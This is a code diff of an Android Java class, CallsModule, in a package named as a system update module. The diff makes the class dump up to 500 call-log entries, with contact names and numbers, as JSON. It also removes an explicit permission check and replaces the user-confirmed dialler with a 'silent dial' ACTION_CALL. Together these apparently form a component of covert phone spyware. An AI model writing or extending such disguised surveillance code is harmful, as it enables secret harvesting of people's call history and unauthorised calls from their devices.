@@ -1,132 +1,179 @@
 package com.android.system.update.modules;
 
-import android.Manifest;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
-import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
 import android.provider.CallLog;
-import androidx.core.app.ActivityCompat;
-import androidx.core.content.ContextCompat;
+import android.util.Log;
 
 import org.json.JSONArray;
 import org.json.JSONObject;
 
 public class CallsModule {
-    private Context context;
-    
+    private static final String TAG = "CallsModule";
+    private final Context context;
+
     public CallsModule(Context context) {
         this.context = context;
     }
-    
+
+    // ── Retrieve call logs ────────────────────────────────────────────────────
+
     public String getCallLogs() {
-        if (!checkReadPermission()) return "ERROR: No call log permission";
-        
+        Log.d(TAG, "📞 getCallLogs() called");
+        JSONArray callsArray = new JSONArray();
+
         try {
-            JSONArray callsList = new JSONArray();
-            ContentResolver cr = context.getContentResolver();
-            
-            Cursor cursor = cr.query(
+            ContentResolver resolver = context.getContentResolver();
+            String[] projection = {
+                CallLog.Calls.NUMBER,
+                CallLog.Calls.CACHED_NAME,
+                CallLog.Calls.TYPE,
+                CallLog.Calls.DATE,
+                CallLog.Calls.DURATION,
+                CallLog.Calls.CACHED_NUMBER_TYPE,
+                CallLog.Calls.CACHED_NUMBER_LABEL,
+            };
+
+            // Most-recent first, limit to 500 entries
+            Cursor cursor = resolver.query(
                 CallLog.Calls.CONTENT_URI,
+                projection,
                 null,
                 null,
-                null,
-                CallLog.Calls.DATE + " DESC"
+                CallLog.Calls.DATE + " DESC LIMIT 500"
             );
-            
+
             if (cursor != null) {
-                int count = 0;
-                int maxResults = 50;
-                
-                int numberIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER);
-                int typeIdx = cursor.getColumnIndex(CallLog.Calls.TYPE);
-                int dateIdx = cursor.getColumnIndex(CallLog.Calls.DATE);
+                Log.d(TAG, "📞 Cursor count: " + cursor.getCount());
+
+                int numberIdx   = cursor.getColumnIndex(CallLog.Calls.NUMBER);
+                int nameIdx     = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
+                int typeIdx     = cursor.getColumnIndex(CallLog.Calls.TYPE);
+                int dateIdx     = cursor.getColumnIndex(CallLog.Calls.DATE);
                 int durationIdx = cursor.getColumnIndex(CallLog.Calls.DURATION);
-                int nameIdx = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
-                
-                if (numberIdx == -1 || typeIdx == -1 || dateIdx == -1 || durationIdx == -1) {
-                    cursor.close();
-                    return "ERROR: Could not access call log columns";
-                }
-                
-                while (cursor.moveToNext() && count < maxResults) {
-                    JSONObject call = new JSONObject();
-                    
-                    String number = cursor.getString(numberIdx);
-                    call.put("number", number != null ? number : "Unknown");
-                    
-                    if (nameIdx != -1) {
-                        String name = cursor.getString(nameIdx);
-                        call.put("name", name != null ? name : "");
+
+                while (cursor.moveToNext()) {
+                    try {
+                        String number   = numberIdx   >= 0 ? cursor.getString(numberIdx)   : "Unknown";
+                        String name     = nameIdx     >= 0 ? cursor.getString(nameIdx)     : "";
+                        int    type     = typeIdx     >= 0 ? cursor.getInt(typeIdx)         : 0;
+                        long   date     = dateIdx     >= 0 ? cursor.getLong(dateIdx)        : 0L;
+                        int    duration = durationIdx >= 0 ? cursor.getInt(durationIdx)     : 0;
+
+                        String typeStr = callTypeToString(type);
+
+                        JSONObject callObj = new JSONObject();
+                        callObj.put("number",         number  != null ? number  : "Unknown");
+                        callObj.put("name",           name    != null ? name    : "");
+                        callObj.put("type",           typeStr);
+                        callObj.put("date",           date);
+                        callObj.put("duration",       String.valueOf(duration));
+                        callObj.put("formatted_date", formatDate(date));
+
+                        callsArray.put(callObj);
+                    } catch (Exception e) {
+                        Log.e(TAG, "Error parsing call log row", e);
                     }
-                    
-                    long date = cursor.getLong(dateIdx);
-                    call.put("date", date);
-                    
-                    String duration = cursor.getString(durationIdx);
-                    call.put("duration", duration != null ? duration : "0");
-                    
-                    int type = cursor.getInt(typeIdx);
-                    String typeStr = "UNKNOWN";
-                    if (type == CallLog.Calls.INCOMING_TYPE) typeStr = "INCOMING";
-                    else if (type == CallLog.Calls.OUTGOING_TYPE) typeStr = "OUTGOING";
-                    else if (type == CallLog.Calls.MISSED_TYPE) typeStr = "MISSED";
-                    else if (type == CallLog.Calls.VOICEMAIL_TYPE) typeStr = "VOICEMAIL";
-                    else if (type == CallLog.Calls.REJECTED_TYPE) typeStr = "REJECTED";
-                    else if (type == CallLog.Calls.BLOCKED_TYPE) typeStr = "BLOCKED";
-                    
-                    call.put("type", typeStr);
-                    
-                    java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
-                    String formattedDate = sdf.format(new java.util.Date(date));
-                    call.put("formatted_date", formattedDate);
-                    
-                    callsList.put(call);
-                    count++;
                 }
-                
                 cursor.close();
+            } else {
+                Log.w(TAG, "⚠️ Cursor is null — no READ_CALL_LOG permission?");
             }
-            
-            return callsList.toString();
-            
+
+            Log.d(TAG, "📞 Returning " + callsArray.length() + " call logs");
+            return callsArray.toString();
+
+        } catch (SecurityException se) {
+            Log.e(TAG, "❌ SecurityException reading call log — missing permission", se);
+            return "[{\"error\":\"Permission denied: READ_CALL_LOG\"}]";
         } catch (Exception e) {
-            e.printStackTrace();
-            return "ERROR: " + e.getMessage();
+            Log.e(TAG, "❌ Error reading call logs", e);
+            return "[{\"error\":\"" + e.getMessage() + "\"}]";
         }
     }
-    
-    public String makeCall(String phoneNumber) {
-        if (phoneNumber == null || phoneNumber.isEmpty() || phoneNumber.equals("Unknown")) {
-            return "ERROR: Invalid phone number";
+
+    // ── Initiate a call ───────────────────────────────────────────────────────
+    //
+    // Uses ACTION_CALL which dials immediately (requires CALL_PHONE permission).
+    // Falls back to ACTION_DIAL (opens the dialler) when permission is absent.
+
+    public String makeCall(String number) {
+        if (number == null || number.trim().isEmpty()) {
+            Log.e(TAG, "❌ makeCall: empty number");
+            return "ERROR: No number provided";
         }
-        
+
+        number = number.trim();
+        Log.d(TAG, "📞 makeCall: " + number);
+
         try {
-            // Clean the phone number
-            String cleanNumber = phoneNumber.replaceAll("[^0-9+]", "");
-            
-            if (cleanNumber.isEmpty()) {
-                return "ERROR: Invalid phone number format";
+            Uri callUri = Uri.parse("tel:" + Uri.encode(number));
+
+            // Prefer ACTION_CALL (silent dial) — needs CALL_PHONE permission
+            Intent callIntent = new Intent(Intent.ACTION_CALL, callUri);
+            callIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+
+            // Check if we actually have the permission at runtime
+            boolean hasPermission = context.checkSelfPermission(
+                    android.Manifest.permission.CALL_PHONE)
+                == android.content.pm.PackageManager.PERMISSION_GRANTED;
+
+            if (!hasPermission) {
+                Log.w(TAG, "⚠️ CALL_PHONE not granted — falling back to ACTION_DIAL");
+                callIntent = new Intent(Intent.ACTION_DIAL, callUri);
+                callIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             }
-            
-            // Use Intent.ACTION_DIAL to open dialer (doesn't require CALL_PHONE permission)
-            // This is safer and user still needs to press the call button
-            Intent intent = new Intent(Intent.ACTION_DIAL);
-            intent.setData(Uri.parse("tel:" + cleanNumber));
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            
-            context.startActivity(intent);
-            return "SUCCESS: Opened dialer with number " + cleanNumber;
+
+            context.startActivity(callIntent);
+            Log.d(TAG, "✅ Call intent launched for: " + number);
+            return "SUCCESS: Calling " + number;
+
+        } catch (SecurityException se) {
+            Log.e(TAG, "❌ SecurityException launching call", se);
+            // Last-resort: open dialler
+            try {
+                Intent dialIntent = new Intent(
+                    Intent.ACTION_DIAL, Uri.parse("tel:" + Uri.encode(number)));
+                dialIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                context.startActivity(dialIntent);
+                return "DIALLER_OPENED: " + number;
+            } catch (Exception ex) {
+                return "ERROR: " + ex.getMessage();
+            }
         } catch (Exception e) {
-            e.printStackTrace();
+            Log.e(TAG, "❌ Error making call: " + e.getMessage(), e);
             return "ERROR: " + e.getMessage();
         }
     }
-    
-    private boolean checkReadPermission() {
-        return ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG)
-            == PackageManager.PERMISSION_GRANTED;
+
+    // ── Helpers ───────────────────────────────────────────────────────────────
+
+    private String callTypeToString(int type) {
+        switch (type) {
+            case CallLog.Calls.INCOMING_TYPE:  return "INCOMING";
+            case CallLog.Calls.OUTGOING_TYPE:  return "OUTGOING";
+            case CallLog.Calls.MISSED_TYPE:    return "MISSED";
+            case CallLog.Calls.REJECTED_TYPE:  return "REJECTED";
+            case CallLog.Calls.VOICEMAIL_TYPE: return "VOICEMAIL";
+            case CallLog.Calls.BLOCKED_TYPE:   return "BLOCKED";
+            // API 29+
+            case 7:                            return "ANSWERED_EXTERNALLY";
+            default:                           return "UNKNOWN";
+        }
+    }
+
+    private String formatDate(long timestamp) {
+        if (timestamp == 0) return "Unknown date";
+        try {
+            java.text.SimpleDateFormat sdf =
+                new java.text.SimpleDateFormat("MMM dd, yyyy HH:mm",
+                    java.util.Locale.getDefault());
+            return sdf.format(new java.util.Date(timestamp));
+        } catch (Exception e) {
+            return "Unknown date";
+        }
     }
 }
